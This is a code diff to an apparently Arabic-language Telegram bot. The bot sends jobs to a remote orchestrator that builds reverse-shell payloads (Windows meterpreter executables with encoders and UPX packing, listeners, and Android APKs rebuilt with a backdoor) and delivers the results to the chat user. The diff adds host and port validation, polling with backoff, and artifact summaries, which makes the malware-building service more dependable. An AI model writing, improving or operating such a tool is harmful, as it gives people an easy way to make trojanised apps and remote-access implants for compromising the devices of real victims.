@@ -12,6 +12,7 @@ from pathlib import Path
 import aiofiles
 import aiohttp
 from datetime import datetime, timedelta
+import ipaddress
 
 import httpx
 from dotenv import load_dotenv
@@ -70,6 +71,22 @@ def _env_summary():
         raise SystemExit(2)
 
 _env_summary()
+
+def _valid_host(value: str) -> bool:
+    try:
+        ipaddress.ip_address(value)
+        return True
+    except Exception:
+        # Allow simple hostnames (letters, digits, hyphens, dots) 1-253 chars
+        if len(value) == 0 or len(value) > 253:
+            return False
+        return all(part and len(part) <= 63 and all(c.isalnum() or c == '-' for c in part) for part in value.split('.'))
+
+def _valid_port(value: str) -> bool:
+    if not value.isdigit():
+        return False
+    p = int(value)
+    return 1 <= p <= 65535
 
 @dataclass
 class Session:
@@ -429,6 +446,10 @@ async def handle_upload_params(update: Update, context: ContextTypes.DEFAULT_TYP
         return UPLOAD_PARAMS
     
     lhost, lport = parts[:2]
+    if not _valid_host(lhost) or not _valid_port(lport):
+        await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة. تأكد من صيغة IP/اسم المضيف ونطاق المنفذ 1-65535.")
+        return UPLOAD_PARAMS
+    
     output_name = parts[2] if len(parts) >= 3 else sess.upload_file_info["original_name"].replace('.apk', '_backdoored')
     
     # Create task parameters
@@ -602,34 +623,22 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("لا توجد جلسة نشطة. استخدم /start")
         return ConversationHandler.END
     parts = update.message.text.strip().split()
-    if sess.kind == "payload":
-        if len(parts) < 3:
-            await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME\nمثال: 192.168.1.10 4444 win_test")
-            return PARAMS
-        lhost, lport, output_name = parts[:3]
-        payload = "windows/meterpreter/reverse_tcp"
-        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
-    elif sess.kind == "winexe":
-        # advanced windows exe
-        if len(parts) < 6:
-            await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME ARCH ENCODERS UPX\nمثال: 127.0.0.1 4444 win_adv x86 x86/shikata_ga_nai:5 true")
-            return PARAMS
-        lhost, lport, output_name, arch, encoders, upx = parts[:6]
-        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "arch": arch, "encoders": encoders, "upx": upx, "payload": "windows/meterpreter/reverse_tcp"}
-    elif sess.kind == "listener":
-        if len(parts) < 2:
-            await update.message.reply_text("الاستخدام: LHOST LPORT\nمثال: 0.0.0.0 4444")
+    if sess.kind in ("payload", "listener"):
+        if len(parts) < 2 + (1 if sess.kind == "payload" else 0):
+            await update.message.reply_text("الاستخدام: LHOST LPORT [OUTPUT_NAME]")
             return PARAMS
         lhost, lport = parts[:2]
-        payload = "windows/meterpreter/reverse_tcp"
-        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
-    elif sess.kind == "android" and not sess.adv:
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
+            return PARAMS
+    if sess.kind == "android" and not sess.adv:
         if len(parts) < 2:
-            await update.message.reply_text("الاستخدام: LHOST LPORT\nأمثلة: 10.0.2.2 4444 أو 192.168.x.x 4444")
+            await update.message.reply_text("الاستخدام: LHOST LPORT")
             return PARAMS
         lhost, lport = parts[:2]
-        payload = "android/meterpreter/reverse_tcp"
-        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
+            return PARAMS
     elif sess.kind == "android" and sess.adv:
         if len(parts) < 4:
             await update.message.reply_text("الاستخدام: MODE PERM LHOST LPORT [OUTPUT_NAME] [KEYSTORE:ALIAS:STOREPASS:KEYPASS]")
@@ -706,26 +715,39 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess: Session):
     chat_id = update.effective_chat.id
     headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
+    last_state = None
+    delay = 2
+    max_delay = 60 * 30  # 30 minutes
     async with httpx.AsyncClient(timeout=600, headers=headers) as client:
-        for _ in range(60):
+        for _ in range(1000):  # enough iterations with backoff
             r = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}")
             r.raise_for_status()
             task = r.json()["task"]
             state = task["state"]
-            state_ar = {"SUBMITTED":"تم الإرسال","PREPARING":"جارِ التحضير","RUNNING":"جارِ التنفيذ","SUCCEEDED":"تم بنجاح","FAILED":"فشل","CANCELLED":"أُلغي"}.get(state, state)
-            await context.bot.send_message(chat_id, f"الحالة: {state_ar}")
+            if state != last_state:
+                state_ar = {"SUBMITTED":"تم الإرسال","PREPARING":"جارِ التحضير","RUNNING":"جارِ التنفيذ","SUCCEEDED":"تم بنجاح","FAILED":"فشل","CANCELLED":"أُلغي"}.get(state, state)
+                await context.bot.send_message(chat_id, f"الحالة: {state_ar}")
+                last_state = state
             if state in ("SUCCEEDED", "FAILED", "CANCELLED"):
                 if state == "SUCCEEDED":
                     arts = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}/artifacts")
                     arts.raise_for_status()
                     artifacts = arts.json()
+                    # ملخص نهائي
+                    summary_lines = []
+                    for a in artifacts:
+                        name = a["name"]
+                        size_b = a.get("size_bytes", 0)
+                        sha = a.get("sha256", "")
+                        summary_lines.append(f"• {name} | {size_b} bytes | {sha}")
+                    await context.bot.send_message(chat_id, "الملخص النهائي للملفات:\n" + "\n".join(summary_lines))
+                    # إرسال الملفات نفسها (نفس آلية المرحلة 2)
                     if artifacts:
                         for a in artifacts:
                             name = a["name"]
                             path_or_url = a["path"]
                             try:
                                 if ENABLE_HTTP_ARTIFACTS and path_or_url.startswith("/tasks/"):
-                                    # Download over HTTP
                                     url = f"{ORCH_URL}{path_or_url}"
                                     async with client.stream("GET", url) as resp:
                                         resp.raise_for_status()
@@ -733,23 +755,23 @@ async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess
                                         async with aiofiles.open(tmpf, "wb") as f:
                                             async for chunk in resp.aiter_bytes():
                                                 await f.write(chunk)
-                                    async with aiofiles.open(tmpf, "rb") as f:
-                                        await context.bot.send_document(chat_id, document=InputFile(tmpf.open("rb"), filename=name), caption="الملف الناتج")
+                                    await context.bot.send_document(chat_id, document=InputFile((TEMP_DIR / f"{sess.task_id}_{name}").open("rb"), filename=name), caption="الملف الناتج")
                                     try:
-                                        tmpf.unlink()
+                                        (TEMP_DIR / f"{sess.task_id}_{name}").unlink()
                                     except Exception:
                                         pass
                                 else:
-                                    # Legacy local path
                                     with open(path_or_url, "rb") as f:
                                         await context.bot.send_document(chat_id, document=InputFile(f, filename=name), caption="الملف الناتج")
                             except Exception as e:
                                 await context.bot.send_message(chat_id, f"تعذّر إرسال {name}: {e}")
                 else:
-                    await context.bot.send_message(chat_id, f"انتهت المهمة بحالة: {state_ar}\nالخطأ: {task.get('error')}")
+                    # فشل/إلغاء: أرسل رابط تحميل build.log
+                    log_url = f"{ORCH_URL}/tasks/{sess.task_id}/logs/build"
+                    await context.bot.send_message(chat_id, f"انتهت المهمة بحالة: {state}\nسجل البناء: {log_url}")
                 return
-            await asyncio.sleep(2)
-    await context.bot.send_message(chat_id, "انتهت مهلة الانتظار دون إكمال المهمة")
+            await asyncio.sleep(delay)
+            delay = min(delay * 2, max_delay)
 
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
